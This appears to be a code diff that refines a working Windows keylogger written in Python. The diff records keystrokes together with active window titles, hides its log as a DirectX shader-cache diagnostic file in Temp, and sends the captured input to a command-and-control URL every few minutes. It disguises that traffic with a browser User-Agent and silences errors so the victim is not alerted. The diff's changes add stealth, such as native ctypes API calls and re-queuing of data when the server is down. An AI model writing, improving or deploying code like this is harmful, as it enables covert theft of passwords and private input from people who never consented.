@@ -3,20 +3,22 @@ import time
 import threading
 import queue
 import requests
-import win32gui
 import os
+import ctypes
 from pynput import keyboard
 
-# Example: C:\%USERS%\User\Appdata\Local\Temp\D3D_ShaderCache_Diag.log
+# Masquerade as a DirectX Diagnostic log in the Temp folder
 LOG_FILE = os.path.join(os.getenv('TEMP'), "D3D_ShaderCache_Diag.log")
-C2_URL = "http://10.0.0.50:8080/api/v1/telemetry"
+C2_URL = "http://10.10.10.158:80/api/v1/telemetry"
 EXFIL_INTERVAL = 300
 
+# Native Windows API Setup
+user32 = ctypes.windll.user32
+
 # Standard local logging
-# Use force=True to ensure the logger resets properly if you've been testing
 logging.basicConfig(filename=LOG_FILE, level=logging.DEBUG, format='%(asctime)s: %(message)s', force=True)
 
-# Thread safe queue and locks for concurrency
+# Thread-safe storage
 exfil_queue = queue.Queue()
 buffer_lock = threading.Lock()
 current_window = ""
@@ -24,23 +26,38 @@ input_buffer = ""
 current_hwnd = None
 
 def get_window_info():
-    """Returns the unique Handle and the verbose Title of the active window."""
+    """Returns the unique Handle and Title using native User32.dll calls."""
     try:
-        hwnd = win32gui.GetForegroundWindow()
-        title = win32gui.GetWindowText(hwnd)
-        # We no longer strip the File Explorer path to ensure full directory visibility
-        return hwnd, title
+        # Get the handle to the active window
+        hwnd = user32.GetForegroundWindow()
+
+        # Get the length of the title to create a buffer of the correct size
+        length = user32.GetWindowTextLengthW(hwnd)
+        buff = ctypes.create_unicode_buffer(length + 1)
+
+        # Fill the buffer with the window title
+        user32.GetWindowTextW(hwnd, buff, length + 1)
+
+        return hwnd, buff.value
     except Exception:
-        return None, "Unknown_Window"
+        return None, "Unknown_Window_Context"
+
+def flush_buffer():
+    """Thread-safe write to local log and exfiltration queue."""
+    global input_buffer, current_window
+    with buffer_lock:
+        if not input_buffer:
+            return
+
+        log_entry = f"[{current_window}] Input: {input_buffer}"
+        logging.info(log_entry)
+        exfil_queue.put(log_entry)
+        input_buffer = ""
 
 def exfiltrate_data():
-    """Periodic exfiltration with a safety flush of the current buffer."""
+    """Background loop that periodically pushes queued data to the C2."""
     while True:
-        # Wait for the interval
         time.sleep(EXFIL_INTERVAL)
-
-        # FORCE a flush of the buffer even if no Enter/Window change occurred
-        # This ensures 'idle' data is still captured and sent
         flush_buffer()
 
         if exfil_queue.empty():
@@ -59,29 +76,24 @@ def exfiltrate_data():
         }
 
         try:
+            # Use a generic User-Agent to blend in with web traffic
             headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
-            requests.post(C2_URL, json=payload, headers=headers, timeout=5)
+            response = requests.post(C2_URL, json=payload, headers=headers, timeout=10)
+
+            # If the C2 accepts the data, we consider it 'delivered'
+            if response.status_code != 200:
+                # If C2 is down, re-queue the data for the next attempt
+                exfil_queue.put(payload_data)
         except Exception:
-            # If the network fails, the data stays in the host's local .log as a fallback
+            # Silence network errors to avoid alerting the user
             pass
 
-def flush_buffer():
-    """Thread-safe write to log and queue."""
-    global input_buffer, current_window
-    with buffer_lock:
-        if not input_buffer:
-            return
-
-        log_entry = f"[{current_window}] Input: {input_buffer}"
-        logging.info(log_entry)
-        exfil_queue.put(log_entry)
-        input_buffer = ""
-
 def on_press(key):
+    """Callback for keyboard events."""
     global current_hwnd, current_window, input_buffer
     new_hwnd, new_title = get_window_info()
 
-    # Context Switch: Flush if the Window Handle (HWND) changes
+    # If the user switches windows, flush the current buffer immediately
     if new_hwnd != current_hwnd:
         if input_buffer:
             flush_buffer()
@@ -90,12 +102,13 @@ def on_press(key):
 
     with buffer_lock:
         try:
+            # Handle standard character keys
             input_buffer += key.char
         except AttributeError:
+            # Handle special keys
             if key == keyboard.Key.enter:
-                # Append the explicit tag before flushing
                 input_buffer += " <enter>"
-                # Flush immediately on Enter so the C2 gets the full command
+                # Run flush in a separate thread to keep the listener responsive
                 threading.Thread(target=flush_buffer).start()
             elif key == keyboard.Key.space:
                 input_buffer += " "
@@ -103,9 +116,11 @@ def on_press(key):
                 input_buffer = input_buffer[:-1]
 
 def main():
+    # Start the exfiltration thread as a daemon
     exfil_thread = threading.Thread(target=exfiltrate_data, daemon=True)
     exfil_thread.start()
 
+    # Start the keyboard listener
     with keyboard.Listener(on_press=on_press) as listener:
         listener.join()
 
